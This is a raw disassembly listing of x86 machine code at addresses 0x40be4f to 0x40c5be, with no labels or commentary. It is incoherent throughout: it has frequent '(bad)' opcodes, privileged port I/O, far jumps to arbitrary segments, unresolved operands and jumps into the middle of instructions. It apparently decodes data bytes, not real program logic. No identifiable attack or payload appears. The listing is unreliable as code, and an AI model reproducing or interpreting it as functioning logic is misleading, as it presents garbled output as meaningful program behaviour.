  40be4f:	popa   
  40be50:	ret    0xa672
  40be53:	or     DWORD PTR [esi+0xecec71b],eax
  40be59:	les    edi,FWORD PTR [ebx+0x2eb1cbeb]
  40be5f:	test   eax,0x4399d51f
  40be64:	dec    esp
  40be65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be66:	inc    esi
  40be67:	repz sbb BYTE PTR [eax],bl
  40be6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be6b:	fs in  eax,dx
  40be6d:	das    
  40be6e:	gs inc ebx
  40be70:	xchg   ecx,edi
  40be72:	push   esi
  40be73:	dec    ecx
  40be74:	cli    
  40be75:	or     DWORD PTR [ebp+0x45],0xad2fc570
  40be7c:	sub    esp,0x80851fb
  40be82:	push   esi
  40be83:	int3   
  40be84:	inc    esp
  40be85:	fldenv [edi-0x76]
  40be88:	add    edx,DWORD PTR [eax-0x47]
  40be8b:	xchg   esp,eax
  40be8c:	sti    
  40be8d:	int    0x8d
  40be8f:	push   0xf
  40be91:	mov    esp,0x8e4eb367
  40be96:	inc    esp
  40be97:	or     eax,0xb04255eb
  40be9c:	and    bl,0x6e
  40be9f:	sub    ah,BYTE PTR [esp+eiz*4-0x1d853813]
  40bea6:	dec    edx
  40bea7:	adc    DWORD PTR [esi+0x3f],edx
  40beaa:	mov    cl,0x6
  40beac:	ins    BYTE PTR es:[edi],dx
  40bead:	fcom   st(1)
  40beaf:	xchg   edx,eax
  40beb0:	mov    esi,0x335861a9
  40beb5:	clc    
  40beb6:	bound  eax,QWORD PTR [ecx-0x68cf82ed]
  40bebc:	repnz xchg dh,bh
  40bebf:	and    DWORD PTR [eax],ecx
  40bec1:	test   DWORD PTR [eax],0x305663f9
  40bec7:	mov    ebp,0xaa51a7e2
  40becc:	scas   al,BYTE PTR es:[edi]
  40becd:	pop    edi
  40bece:	imul   ecx,DWORD PTR [eax],0x6d458de6
  40bed4:	jno    0x40beaa
  40bed6:	stos   BYTE PTR es:[edi],al
  40bed7:	loopne 0x40befc
  40bed9:	mov    al,ds:0xac67f89f
  40bede:	enter  0x6d43,0x57
  40bee2:	aad    0x3a
  40bee4:	outs   dx,BYTE PTR ds:[esi]
  40bee5:	add    ebx,DWORD PTR [ebx-0x2f6cf1fd]
  40beeb:	mov    ecx,0xa6c684f6
  40bef0:	sahf   
  40bef1:	pop    edx
  40bef2:	mov    al,ds:0x2d6c7ab1
  40bef7:	xlat   BYTE PTR ds:[ebx]
  40bef8:	clc    
  40bef9:	inc    edx
  40befa:	cdq    
  40befb:	js     0x40bf35
  40befd:	mov    bl,BYTE PTR [ebp+0xf7892c9]
  40bf03:	xor    DWORD PTR [edi-0x64a1386e],edi
  40bf09:	fldenv [edi+0x17]
  40bf0c:	adc    eax,0x204162d7
  40bf11:	push   ss
  40bf12:	sbb    eax,0xebda96a0
  40bf17:	mov    bl,0x56
  40bf19:	xchg   ebx,eax
  40bf1a:	enter  0xa3ac,0x4d
  40bf1e:	cwde   
  40bf1f:	jno    0x40bee7
  40bf21:	xchg   ebx,eax
  40bf22:	cs adc dl,bh
  40bf25:	aad    0x69
  40bf27:	int    0x7
  40bf29:	out    0xb3,al
  40bf2b:	in     al,0xbd
  40bf2d:	mov    al,ds:0x1b84f277
  40bf32:	js     0x40bf51
  40bf34:	out    0x9c,eax
  40bf36:	addr16 loopne 0x40bf79
  40bf39:	inc    ebp
  40bf3a:	ins    BYTE PTR es:[edi],dx
  40bf3b:	stos   BYTE PTR es:[edi],al
  40bf3c:	xor    al,ah
  40bf3e:	(bad)  ds:0xb2b08d7e
  40bf44:	js     0x40bf2e
  40bf46:	test   eax,0x8daecb8e
  40bf4b:	stos   BYTE PTR es:[edi],al
  40bf4c:	pop    esp
  40bf4d:	push   es
  40bf4e:	out    0x9a,eax
  40bf50:	jmp    0x40befd
  40bf52:	out    dx,al
  40bf53:	fucomi st,st(5)
  40bf55:	sub    esi,DWORD PTR [edx-0x7e7a7209]
  40bf5b:	outs   dx,DWORD PTR ds:[esi]
  40bf5c:	or     DWORD PTR [edi+0x2377ab70],ebx
  40bf62:	maxps  xmm4,XMMWORD PTR [edx]
  40bf65:	inc    eax
  40bf66:	stc    
  40bf67:	dec    ebx
  40bf68:	adc    DWORD PTR [esi],edi
  40bf6a:	jl     0x40bf3a
  40bf6c:	fidivr DWORD PTR [edi-0x37ab9f7c]
  40bf72:	ins    BYTE PTR es:[edi],dx
  40bf73:	popa   
  40bf74:	shr    BYTE PTR ds:0x77f19b6d,0x97
  40bf7b:	cmp    eax,0x75cc3d1a
  40bf80:	(bad)
  40bf83:	fcomp  QWORD PTR [esi+ebx*1-0x6bfc5de6]
  40bf8a:	dec    esi
  40bf8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf8c:	dec    ebp
  40bf8d:	ins    BYTE PTR es:[edi],dx
  40bf8e:	sbb    BYTE PTR [eax+0x64],cl
  40bf91:	aaa    
  40bf92:	(bad)  
  40bf93:	out    0x18,eax
  40bf95:	in     al,dx
  40bf96:	xchg   DWORD PTR [ebx],esp
  40bf98:	cwde   
  40bf99:	(bad)  
  40bf9a:	pop    ebx
  40bf9b:	push   edi
  40bf9c:	push   ebp
  40bf9d:	fcom   DWORD PTR [edx+0x2bf153a5]
  40bfa3:	shl    esp,0x57
  40bfa6:	popa   
  40bfa7:	xchg   edx,eax
  40bfa8:	js     0x40bf7a
  40bfaa:	in     al,dx
  40bfab:	mov    BYTE PTR [esi],bl
  40bfad:	out    0x34,eax
  40bfaf:	xchg   ebp,eax
  40bfb0:	xor    esi,DWORD PTR [eax-0x5acc302]
  40bfb6:	(bad)  
  40bfb7:	ins    DWORD PTR es:[edi],dx
  40bfb8:	fmul   st,st(2)
  40bfba:	jge    0x40bf8b
  40bfbc:	popf   
  40bfbd:	iret   
  40bfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfbf:	test   DWORD PTR [edi-0x310c930e],edx
  40bfc5:	jmp    0x7fe9:0x32418744
  40bfcc:	mov    dl,0xa4
  40bfce:	cmp    BYTE PTR [esp+ebx*4-0x7b],dh
  40bfd2:	mov    al,ds:0xf1d09340
  40bfd7:	adc    dh,bh
  40bfd9:	fmul   st,st(2)
  40bfdb:	fsub   st,st(6)
  40bfdd:	mov    ds,WORD PTR [edi-0x2a7f5146]
  40bfe3:	and    DWORD PTR [esp+eax*1-0x74],0xa6fc2d87
  40bfeb:	or     bh,ah
  40bfed:	push   esp
  40bfee:	add    DWORD PTR [ecx],0x2d
  40bff1:	or     ch,BYTE PTR [ebx-0x52]
  40bff4:	pop    eax
  40bff5:	nop
  40bff6:	shr    BYTE PTR [edi],0x98
  40bff9:	adc    eax,0x19e47a21
  40bffe:	ret    
  40bfff:	xor    eax,0x2159e84a
  40c004:	jmp    0x40c036
  40c006:	xchg   ebx,eax
  40c007:	mov    ah,0x43
  40c009:	(bad)  
  40c00a:	popf   
  40c00b:	div    DWORD PTR [edi+0x7]
  40c00e:	xchg   ebx,eax
  40c00f:	sub    eax,0x9815b819
  40c014:	pop    edi
  40c015:	icebp  
  40c016:	rcl    DWORD PTR [edx+0x7c],1
  40c019:	into   
  40c01a:	sbb    BYTE PTR [edx],dh
  40c01c:	cdq    
  40c01d:	fstp   TBYTE PTR [ebx+0x64]
  40c020:	stos   DWORD PTR es:[edi],eax
  40c021:	stos   BYTE PTR es:[edi],al
  40c022:	push   ecx
  40c023:	mov    bl,0x28
  40c025:	mov    WORD PTR ds:0x87a96c68,es
  40c02b:	adc    bh,0x76
  40c02e:	idiv   BYTE PTR [ecx+0x1fa47eae]
  40c034:	(bad)  
  40c035:	shl    esp,cl
  40c037:	jmp    0x40c07f
  40c039:	inc    edx
  40c03a:	fstp   st(7)
  40c03c:	push   ecx
  40c03d:	lods   eax,DWORD PTR ds:[esi]
  40c03e:	jae    0x40c011
  40c040:	fistp  QWORD PTR [ebp-0x4a80dbcd]
  40c046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c047:	imul   eax,esp,0x5
  40c04a:	xchg   edx,eax
  40c04b:	lds    esp,FWORD PTR [ecx-0xb]
  40c04e:	mov    DWORD PTR [edi-0x6671b64c],edi
  40c054:	push   es
  40c055:	in     al,dx
  40c056:	dec    esp
  40c057:	lea    ecx,[esi-0x4eb4ca67]
  40c05d:	mov    ebx,0x4b5f7da0
  40c062:	xchg   esp,eax
  40c063:	ror    cl,0xb5
  40c066:	dec    esi
  40c067:	jmp    0xcb1a:0x4739e9e6
  40c06e:	sub    al,0x3b
  40c070:	dec    ebp
  40c071:	test   al,0x59
  40c073:	lea    eax,ds:0x3e87e128
  40c079:	adc    dl,BYTE PTR [ecx+eiz*1-0x7f7fff97]
  40c080:	hlt    
  40c081:	push   esi
  40c082:	fcom   QWORD PTR [esi+0x40cfc805]
  40c088:	xor    ch,bh
  40c08a:	jbe    0x40c0f5
  40c08c:	int3   
  40c08d:	mov    edi,ecx
  40c08f:	frstor [esi]
  40c091:	std    
  40c092:	xor    edi,DWORD PTR [ecx]
  40c094:	add    DWORD PTR [edi+0x3],ebp
  40c097:	lods   al,BYTE PTR ds:[esi]
  40c098:	and    ah,BYTE PTR [edx+0x1e2b141e]
  40c09e:	pop    esi
  40c09f:	pop    ds
  40c0a0:	pop    esi
  40c0a1:	ret    
  40c0a2:	test   al,0xff
  40c0a4:	leave  
  40c0a5:	mov    al,0x3
  40c0a7:	test   ch,dh
  40c0a9:	out    dx,eax
  40c0aa:	jg     0x40c057
  40c0ac:	pop    eax
  40c0ad:	fisttp QWORD PTR [edx+0x29e007bd]
  40c0b3:	retf   0xa4fb
  40c0b6:	mov    eax,0x9ff867df
  40c0bb:	adc    ebx,edx
  40c0bd:	les    ecx,FWORD PTR [edx-0x14]
  40c0c0:	pop    esp
  40c0c1:	cmp    edi,esp
  40c0c3:	fsub   st(1),st
  40c0c5:	pop    esp
  40c0c6:	rcl    BYTE PTR [edx+0x6c],0x9a
  40c0ca:	cmp    eax,0x1739c7dd
  40c0cf:	and    dl,ch
  40c0d1:	nop
  40c0d2:	jnp    0x40c0f6
  40c0d4:	dec    esp
  40c0d5:	and    DWORD PTR [ebx],edi
  40c0d7:	(bad)  [ebp-0x26]
  40c0da:	jne    0x40c094
  40c0dc:	lahf   
  40c0dd:	(bad)  
  40c0de:	xchg   esp,eax
  40c0df:	test   DWORD PTR [esi-0x2f49c41b],eax
  40c0e5:	mov    eax,ds:0x24ecbf1c
  40c0ea:	aam    0xc5
  40c0ec:	sbb    eax,0x8b8c66fb
  40c0f1:	cmp    edx,ecx
  40c0f3:	xchg   ecx,eax
  40c0f4:	dec    esi
  40c0f5:	sbb    esi,DWORD PTR [esi-0x7b1eafd8]
  40c0fb:	pop    ebx
  40c0fc:	dec    ebp
  40c0fd:	clc    
  40c0fe:	pop    esp
  40c0ff:	rol    DWORD PTR [ebx],cl
  40c101:	imul   eax,DWORD PTR [esi-0x4f],0xb0ab0f5a
  40c108:	add    al,0x62
  40c10a:	push   ss
  40c10b:	add    eax,0x5e0b026a
  40c110:	adc    eax,0x1858fa65
  40c115:	adc    ch,dh
  40c117:	test   DWORD PTR gs:[edx-0x53],edi
  40c11b:	mov    ds:0x15b712a3,eax
  40c120:	mov    ebp,0xfe8789e1
  40c125:	push   cs
  40c126:	xor    al,0x92
  40c128:	rcl    DWORD PTR [ebp-0x4ec47fdc],1
  40c12e:	cmc    
  40c12f:	add    DWORD PTR [esi+0x4ed83b43],edx
  40c135:	call   0x5bd4:0x9ec4c4a2
  40c13c:	sub    ebp,ecx
  40c13e:	push   esi
  40c13f:	jae    0x40c11c
  40c141:	inc    ebp
  40c142:	stos   DWORD PTR es:[edi],eax
  40c143:	in     al,dx
  40c144:	sbb    ah,BYTE PTR [eax]
  40c146:	ja     0x45965709
  40c14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c14d:	mov    dl,0x9c
  40c14f:	and    al,0xb5
  40c151:	or     bl,dl
  40c153:	ret    
  40c154:	adc    dh,BYTE PTR [ebp-0x417ef2b5]
  40c15a:	fimul  DWORD PTR [eax]
  40c15c:	mov    esi,edi
  40c15e:	sti    
  40c15f:	into   
  40c160:	scas   al,BYTE PTR es:[edi]
  40c161:	pusha  
  40c162:	inc    edi
  40c163:	nop
  40c164:	out    dx,eax
  40c165:	iret   
  40c166:	adc    bh,BYTE PTR [edx-0x13]
  40c169:	mov    esp,0x570ee1b8
  40c16e:	and    DWORD PTR [esi+0x2039fa40],0x3
  40c175:	aaa    
  40c176:	fisttp WORD PTR [ebx+0x2]
  40c179:	xor    BYTE PTR [edx+0x42],dh
  40c17c:	dec    edx
  40c17d:	js     0x40c11d
  40c17f:	and    dl,BYTE PTR [esp+edi*4]
  40c182:	inc    esp
  40c183:	adc    edx,DWORD PTR [ebp+0x2e]
  40c186:	std    
  40c187:	push   ecx
  40c188:	jmp    0xe59e:0x6d90b13d
  40c18f:	mov    DWORD PTR [edx+0x58],ecx
  40c192:	daa    
  40c193:	pop    edi
  40c194:	sar    ch,0x7
  40c197:	ins    DWORD PTR es:[edi],dx
  40c198:	test   BYTE PTR [ecx],ch
  40c19a:	scas   eax,DWORD PTR es:[edi]
  40c19b:	fist   DWORD PTR [edi]
  40c19d:	dec    eax
  40c19e:	push   ss
  40c19f:	mov    edi,0x6410e16b
  40c1a4:	loopne 0x40c1c1
  40c1a6:	(bad)  
  40c1a7:	js     0x40c21b
  40c1a9:	int3   
  40c1aa:	sub    eax,0x5311d57f
  40c1af:	out    dx,eax
  40c1b0:	push   es
  40c1b1:	push   edi
  40c1b2:	test   DWORD PTR [edi-0xac80960],0x21cd15a5
  40c1bc:	shl    BYTE PTR [ebx],1
  40c1be:	mov    ebx,0xaab6f360
  40c1c3:	inc    ebp
  40c1c4:	dec    esi
  40c1c5:	xor    al,BYTE PTR [ecx]
  40c1c7:	(bad)  
  40c1c9:	pop    es
  40c1ca:	(bad)  
  40c1cb:	iret   
  40c1cc:	in     eax,0x1d
  40c1ce:	sub    DWORD PTR [eax+edi*1],0xffffffc6
  40c1d2:	inc    eax
  40c1d3:	sahf   
  40c1d4:	jge    0x40c1c7
  40c1d6:	cmp    ecx,DWORD PTR [ebx]
  40c1d8:	or     BYTE PTR gs:[ebx-0x49],cl
  40c1dc:	dec    edx
  40c1dd:	push   ebx
  40c1de:	inc    esi
  40c1df:	jmp    0x7461023c
  40c1e4:	loopne 0x40c1e0
  40c1e6:	sub    DWORD PTR [ecx],esp
  40c1e8:	sub    bh,dl
  40c1ea:	leave  
  40c1eb:	sbb    BYTE PTR [edx],ah
  40c1ed:	test   BYTE PTR [esi],bh
  40c1ef:	jp     0x40c22c
  40c1f1:	mov    edi,0x37ac7d49
  40c1f6:	pushf  
  40c1f7:	int3   
  40c1f8:	xchg   edi,eax
  40c1f9:	mov    esi,ebp
  40c1fb:	xor    DWORD PTR [ebx],0xfffffff2
  40c1fe:	imul   DWORD PTR [edx+ebx*4+0x24]
  40c202:	cmp    eax,0xa0a94961
  40c207:	(bad)  
  40c209:	and    DWORD PTR [esp+edi*2+0x12],0xa2b0739f
  40c211:	sub    ebx,edi
  40c213:	loopne 0x40c1fb
  40c215:	sbb    ecx,esi
  40c217:	mov    esi,0xb1a8142a
  40c21c:	addr16 lahf 
  40c21e:	(bad)  
  40c21f:	mov    ch,bh
  40c221:	xchg   ebx,eax
  40c222:	xchg   esp,eax
  40c223:	jb     0x40c25f
  40c225:	add    al,0x9a
  40c227:	xlat   BYTE PTR ds:[ebx]
  40c228:	pop    eax
  40c229:	push   esp
  40c22a:	and    edx,esp
  40c22c:	fsub   QWORD PTR [eax]
  40c22e:	fbld   TBYTE PTR [ebx*1+0x5d0eae29]
  40c235:	pushf  
  40c236:	loopne 0x40c24d
  40c238:	jmp    0x27b5:0xeef33dac
  40c23f:	imul   esp,ebp,0xff809653
  40c245:	loope  0x40c290
  40c247:	push   edi
  40c248:	jmp    0x40c244
  40c24a:	pop    edx
  40c24b:	lds    eax,FWORD PTR [edi]
  40c24d:	neg    edi
  40c24f:	(bad)  
  40c250:	aas    
  40c251:	scas   al,BYTE PTR es:[edi]
  40c252:	ficomp DWORD PTR [ebx+0x46]
  40c255:	(bad)  
  40c256:	xor    DWORD PTR [ebp-0x67],edx
  40c259:	pop    esp
  40c25a:	icebp  
  40c25b:	push   0xc491961f
  40c260:	sbb    eax,0x77120409
  40c265:	sbb    eax,0xe03accd2
  40c26a:	xchg   esi,eax
  40c26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c26c:	mov    ecx,0x21090b2e
  40c271:	ret    0xa2f8
  40c274:	pop    ebx
  40c275:	adc    eax,0x241ac376
  40c27a:	fs xor eax,0x5ac3489b
  40c280:	nop
  40c281:	loop   0x40c27a
  40c283:	fidivr DWORD PTR [eax-0x3d9326ef]
  40c289:	loope  0x40c21e
  40c28b:	add    al,0xbc
  40c28d:	adc    DWORD PTR [ebx],edx
  40c28f:	mov    esi,0xa45344a
  40c294:	sar    DWORD PTR [eax-0x4d65169e],cl
  40c29a:	aad    0x48
  40c29c:	cmp    al,0x18
  40c29e:	(bad)  gs:[ecx+0xc]
  40c2a2:	xchg   esp,eax
  40c2a3:	lock fsubr DWORD PTR [esi+0x78]
  40c2a7:	jo     0x40c2a8
  40c2a9:	pop    ebx
  40c2aa:	xchg   edi,eax
  40c2ab:	mov    ecx,0xb6514549
  40c2b0:	mov    ah,0x29
  40c2b2:	cmp    al,0x3e
  40c2b4:	jno    0x40c260
  40c2b6:	adc    BYTE PTR [ecx+0x2],bl
  40c2b9:	cmp    ebp,DWORD PTR [ecx-0x7f]
  40c2bc:	retf   
  40c2bd:	add    al,0x7b
  40c2bf:	stos   BYTE PTR es:[edi],al
  40c2c0:	fidivr WORD PTR [ebp+ecx*1+0x4888b4e3]
  40c2c7:	lahf   
  40c2c8:	push   edi
  40c2c9:	mov    ?,WORD PTR ds:0x46852846
  40c2cf:	push   0x43
  40c2d1:	cmp    BYTE PTR ds:[edi-0x885cdbe],bh
  40c2d8:	sub    eax,0x23c66a7c
  40c2dd:	jmp    0x691c:0x576bf726
  40c2e4:	scas   eax,DWORD PTR es:[edi]
  40c2e5:	scas   eax,DWORD PTR es:[edi]
  40c2e6:	test   al,0x86
  40c2e8:	mov    esi,0x79de464c
  40c2ed:	lea    eax,[ecx-0x7d6c5400]
  40c2f3:	jb     0x40c2c5
  40c2f5:	mov    al,ds:0xac12c78e
  40c2fa:	push   ebx
  40c2fb:	jae    0x40c31e
  40c2fd:	lods   eax,DWORD PTR ds:[esi]
  40c2fe:	dec    ecx
  40c2ff:	xor    al,0x25
  40c301:	add    eax,0x3eefe9e9
  40c306:	cli    
  40c307:	add    DWORD PTR [edx],0xffffffa9
  40c30a:	sbb    eax,0x58b4baa4
  40c30f:	nop
  40c310:	jg     0x40c2a1
  40c312:	sbb    edx,esi
  40c314:	xor    DWORD PTR [eax],eax
  40c316:	push   es
  40c317:	sahf   
  40c318:	(bad)  
  40c319:	fistp  QWORD PTR ds:0x94feaf1f
  40c31f:	cld    
  40c320:	aam    0x8a
  40c322:	cs pop esp
  40c324:	xchg   edx,eax
  40c325:	xor    esi,DWORD PTR [edi]
  40c327:	inc    edx
  40c328:	mov    ds:0xbf89ad43,al
  40c32d:	cmp    al,0xfa
  40c32f:	mov    ah,0xc3
  40c331:	mov    bh,0x5d
  40c333:	mov    bh,BYTE PTR [esi+0x65]
  40c336:	imul   eax,DWORD PTR [eax+ecx*2+0x6edbe148],0xb014dc1
  40c341:	push   ss
  40c342:	fwait
  40c343:	mov    DWORD PTR [esi-0x4a],esi
  40c346:	inc    esi
  40c347:	fdiv   st,st(7)
  40c349:	add    eax,0xf7cdf030
  40c34e:	jmp    0x40c34d
  40c350:	or     DWORD PTR [ecx],0x227bd379
  40c356:	das    
  40c357:	xor    BYTE PTR [esi],dh
  40c359:	push   0x3e
  40c35b:	loopne 0x40c326
  40c35d:	cli    
  40c35e:	in     eax,dx
  40c35f:	mov    ch,bh
  40c361:	hlt    
  40c362:	cld    
  40c363:	and    BYTE PTR [edi+0x78],0x18
  40c367:	scas   al,BYTE PTR es:[edi]
  40c368:	cld    
  40c369:	push   esi
  40c36a:	imul   ecx,DWORD PTR [edx-0x7e],0xe08ad98
  40c371:	inc    esp
  40c372:	imul   esi,DWORD PTR [ecx-0x7f69bffe],0xffffffa8
  40c379:	imul   ecx,esp,0xcc74dc5d
  40c37f:	gs adc edi,ebx
  40c382:	dec    esp
  40c383:	vmwrite ecx,DWORD PTR [esi+0x15]
  40c387:	pushf  
  40c388:	cld    
  40c389:	ror    DWORD PTR [ecx+ebp*1-0x3b],cl
  40c38d:	push   edx
  40c38e:	lahf   
  40c38f:	inc    edx
  40c390:	xchg   ebx,eax
  40c391:	nop
  40c392:	push   ebx
  40c393:	pop    es
  40c394:	jmp    0x40c3bc
  40c396:	sahf   
  40c397:	mov    eax,0xd871ae9c
  40c39c:	stc    
  40c39d:	pop    esi
  40c39e:	jmp    0x84f6c5c7
  40c3a3:	add    BYTE PTR [ebx+0x3b],bl
  40c3a6:	xchg   edi,eax
  40c3a7:	xor    dh,BYTE PTR [edi-0x38f45baf]
  40c3ad:	ret    
  40c3ae:	mov    esi,0xb1a4a379
  40c3b3:	fst    DWORD PTR [esp+esi*4-0x4ba49984]
  40c3ba:	adc    eax,0x4b5450ca
  40c3bf:	cs mov cl,0x17
  40c3c2:	jno    0x40c3c6
  40c3c4:	clc    
  40c3c5:	push   es
  40c3c6:	and    ch,0xa0
  40c3c9:	jge    0x40c3ff
  40c3cb:	push   ebp
  40c3cc:	mov    esp,0x801237f8
  40c3d1:	icebp  
  40c3d2:	aas    
  40c3d3:	xchg   edi,eax
  40c3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d5:	jbe    0x40c3d9
  40c3d7:	jb     0x40c3df
  40c3d9:	arpl   WORD PTR [eax-0x602fdf92],di
  40c3df:	sar    BYTE PTR [ebp-0x174b5844],cl
  40c3e5:	inc    esi
  40c3e6:	cmp    ecx,DWORD PTR [edi+0x56]
  40c3e9:	inc    ebx
  40c3ea:	push   ebx
  40c3eb:	repnz mov edi,0x5a6753b4
  40c3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3f2:	push   esp
  40c3f3:	push   esp
  40c3f4:	mov    BYTE PTR [ebp-0x68],cl
  40c3f7:	arpl   WORD PTR [ebx],ax
  40c3f9:	into   
  40c3fa:	inc    edx
  40c3fb:	mov    esp,0xeb32b0dd
  40c400:	adc    DWORD PTR [edi],edx
  40c402:	jge    0x40c41e
  40c404:	sub    DWORD PTR [ebx-0x23],ebx
  40c407:	les    esp,FWORD PTR [ecx+0x6b]
  40c40a:	mov    ecx,0x53d87852
  40c40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c411:	cli    
  40c412:	add    al,al
  40c414:	in     eax,0x4
  40c416:	push   0xffffffb0
  40c418:	in     al,dx
  40c419:	or     eax,0xcd622dab
  40c41e:	mov    al,ds:0xe98e2e46
  40c423:	dec    ebp
  40c424:	test   eax,0x1798d8d6
  40c429:	inc    ecx
  40c42a:	mov    al,0xa1
  40c42c:	add    esp,DWORD PTR [eax-0x6816a2dc]
  40c432:	mov    ecx,DWORD PTR [eax-0x61]
  40c435:	out    0xd,eax
  40c437:	leave  
  40c438:	push   ebx
  40c439:	jnp    0x40c462
  40c43b:	cwde   
  40c43c:	add    al,0xcd
  40c43e:	dec    ecx
  40c43f:	andps  xmm6,XMMWORD PTR [edi]
  40c442:	mov    cl,0xc
  40c444:	lods   al,BYTE PTR ds:[esi]
  40c445:	jmp    0x40c440
  40c447:	lea    eax,[edi+0x1995c599]
  40c44d:	push   0xb38e8f0
  40c452:	(bad)  
  40c453:	(bad)  
  40c454:	fisttp QWORD PTR [ebx+ebp*2]
  40c457:	pop    esp
  40c458:	ret    0x5ce0
  40c45b:	imul   ebp,DWORD PTR [edx],0x511ed1c3
  40c461:	ret    
  40c462:	mov    ebp,0x6001e9d7
  40c467:	sub    ebp,edi
  40c469:	fidivr WORD PTR [ebx+0x37]
  40c46c:	out    0x1d,al
  40c46e:	bound  ebx,QWORD PTR fs:[edx+0x11]
  40c472:	dec    esp
  40c473:	push   0x68
  40c475:	jle    0x40c48b
  40c477:	hlt    
  40c478:	repnz add DWORD PTR [ebp-0x769f481b],ecx
  40c47f:	cmc    
  40c480:	fidivr DWORD PTR [ecx]
  40c482:	aas    
  40c483:	es dec ebp
  40c485:	jns    0x40c40c
  40c487:	dec    ecx
  40c488:	pusha  
  40c489:	rol    DWORD PTR [ebx+0x12],0xd7
  40c48d:	dec    edi
  40c48e:	xchg   DWORD PTR [eax],ebx
  40c490:	mov    al,ds:0x563c493f
  40c495:	add    edi,ebp
  40c497:	add    al,0xd4
  40c499:	fdivrp st(0),st
  40c49b:	mov    bh,0xfb
  40c49d:	sbb    BYTE PTR [edi+ebp*2+0x6c53bd97],ah
  40c4a4:	test   dh,0x5b
  40c4a7:	inc    ebx
  40c4a8:	lahf   
  40c4a9:	jg     0x40c4ba
  40c4ab:	sbb    bh,BYTE PTR [ebx+0x72]
  40c4ae:	xchg   esi,eax
  40c4af:	test   BYTE PTR [esi+0x3a],bl
  40c4b2:	outs   dx,DWORD PTR cs:[esi]
  40c4b4:	outs   dx,BYTE PTR ds:[esi]
  40c4b5:	inc    eax
  40c4b6:	repz sbb BYTE PTR [ebx+0x78],bh
  40c4ba:	pop    ss
  40c4bb:	xchg   esi,eax
  40c4bc:	in     al,dx
  40c4bd:	cmp    ecx,DWORD PTR [esi-0x24a42a6d]
  40c4c3:	std    
  40c4c4:	scas   al,BYTE PTR es:[edi]
  40c4c5:	test   DWORD PTR [ecx],ecx
  40c4c7:	pusha  
  40c4c8:	xchg   DWORD PTR [esi-0x24],edi
  40c4cb:	adc    DWORD PTR [esi-0x2b],0xfffffffa
  40c4cf:	test   al,0x12
  40c4d1:	dec    eax
  40c4d2:	mov    ?,WORD PTR [edi-0x70838a77]
  40c4d8:	xchg   BYTE PTR [edx],al
  40c4da:	add    dl,BYTE PTR [ebp+0x70]
  40c4dd:	int    0x25
  40c4df:	(bad)  
  40c4e0:	dec    esi
  40c4e1:	push   ds
  40c4e2:	mov    al,0x51
  40c4e4:	in     eax,0xe8
  40c4e6:	ja     0x40c519
  40c4e8:	push   esi
  40c4e9:	in     eax,dx
  40c4ea:	xchg   BYTE PTR [edx+0x3a],dh
  40c4ed:	inc    edi
  40c4ee:	out    0x9e,eax
  40c4f0:	push   0xffffff95
  40c4f2:	jl     0x40c4f6
  40c4f4:	sub    BYTE PTR [eax+0x62da8a82],ah
  40c4fa:	fild   WORD PTR [esi+0x5404ec0c]
  40c500:	inc    esi
  40c501:	shl    edx,cl
  40c503:	sbb    ebx,DWORD PTR [ecx+ebx*8+0x64]
  40c507:	out    dx,eax
  40c508:	cmp    ebp,DWORD PTR [ecx]
  40c50a:	pop    ebx
  40c50b:	jp     0x40c51c
  40c50d:	jmp    0xc405:0x86a4d2a7
  40c514:	and    BYTE PTR [ebx-0x4d],bh
  40c517:	imul   edx,esi,0xfffffff9
  40c51a:	(bad)  [edx-0x27]
  40c51d:	pushf  
  40c51e:	(bad)  
  40c51f:	jle    0x40c4db
  40c521:	xor    ah,BYTE PTR [ebp-0x392f4529]
  40c527:	add    eax,DWORD PTR [ebx]
  40c529:	and    BYTE PTR [ecx-0x29],bl
  40c52c:	jl     0x40c51a
  40c52e:	(bad)  
  40c52f:	and    dl,dl
  40c531:	stc    
  40c532:	pushf  
  40c533:	adc    bl,bl
  40c535:	mov    ebx,0x2529cf3b
  40c53a:	je     0x40c587
  40c53c:	daa    
  40c53d:	pop    ss
  40c53e:	mov    ebx,0x97427ece
  40c543:	cld    
  40c544:	cdq    
  40c545:	out    dx,eax
  40c546:	push   ss
  40c547:	scas   al,BYTE PTR es:[edi]
  40c548:	mov    ch,0x9d
  40c54a:	push   es
  40c54b:	mov    WORD PTR [edi],gs
  40c54d:	in     eax,0xa2
  40c54f:	dec    ebx
  40c550:	or     edi,DWORD PTR ds:0x69f7ffa4
  40c556:	adc    edx,DWORD PTR [ebx+0x5f]
  40c559:	lahf   
  40c55a:	sub    BYTE PTR [edi+0x7e],0xdc
  40c55e:	mov    al,0x19
  40c560:	mov    esi,DWORD PTR [edi+0x144d0bcc]
  40c566:	adc    DWORD PTR [ecx-0x1c4465ca],0x5b
  40c56d:	xor    edi,ebx
  40c56f:	pop    ebx
  40c570:	jo     0x40c5e6
  40c572:	div    DWORD PTR [ecx+0xc]
  40c575:	dec    esi
  40c576:	hlt    
  40c577:	ret    0x7fa3
  40c57a:	or     al,0x6e
  40c57c:	mov    edx,0xb9ae6733
  40c581:	fdiv   DWORD PTR [ebx-0x6d]
  40c584:	ror    DWORD PTR [ebx-0x2d9166b6],cl
  40c58a:	mov    esp,0x312050c9
  40c58f:	push   eax
  40c590:	daa    
  40c591:	stc    
  40c592:	jecxz  0x40c526
  40c594:	(bad)  
  40c595:	jmp    0xf956:0x5c5ef372
  40c59c:	int3   
  40c59d:	push   cs
  40c59e:	and    eax,0xbe0c8704
  40c5a3:	xor    BYTE PTR [ebp+0x6a],bl
  40c5a6:	mov    edi,0x34727a44
  40c5ab:	xchg   ebp,eax
  40c5ac:	in     al,0xcf
  40c5ae:	mov    eax,0xab92de01
  40c5b3:	aas    
  40c5b4:	ret    
  40c5b5:	fs pop es
  40c5b7:	or     ebx,DWORD PTR [eax+ebx*2-0x3d]
  40c5bb:	rcr    DWORD PTR [eax+0x19],cl
  40c5be:	pop    es
